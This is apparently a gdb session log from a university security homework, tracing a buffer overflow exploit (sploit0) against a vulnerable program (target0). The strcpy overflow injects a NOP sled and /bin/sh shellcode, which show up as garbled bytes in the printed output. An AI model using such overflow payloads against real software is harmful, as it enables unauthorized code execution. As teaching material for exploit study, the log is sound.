Reading symbols from sploit0...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit0.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x8048632
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff558, args: 
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) n
process 1940 is executing new program: /tmp/target0

Breakpoint 1, main (argc=2, argv=0xbffffd64) at target0.c:16
16		greeting( argv[1] );
(gdb) break 8
Breakpoint 3 at 0x8048474: file target0.c, line 8.
(gdb) info frame
Stack level 0, frame at 0xbffffcd0:
 eip = 0x80484b6 in main (target0.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffcc8, args: argc=2, argv=0xbffffd64
 Locals at 0xbffffcc8, Previous frame's sp is 0xbffffcd0
 Saved registers:
  ebp at 0xbffffcc8, eip at 0xbffffccc
(gdb) x/x eip
No symbol "eip" in current context.
(gdb) x/x $eip
0x80484b6 <main+3>:	0x830c458b
(gdb) x/x $esp
0xbffffcc8:	0x00000000
(gdb) n

Breakpoint 3, greeting (temp1=0xbffffe57 '\220' <repeats 200 times>...) at target0.c:8
8		memset(name, 0, 400);
(gdb) x/x $esp
0xbffffb2c:	0xb7f642a2
(gdb) n
9		strcpy(name, temp1);
(gdb) x/x $esp
0xbffffb2c:	0x00000000
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) x/x $esp
0xbffffb2c:	0x90909090
(gdb) n
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
11	}
(gdb) 
0x00bffff2 in ?? ()
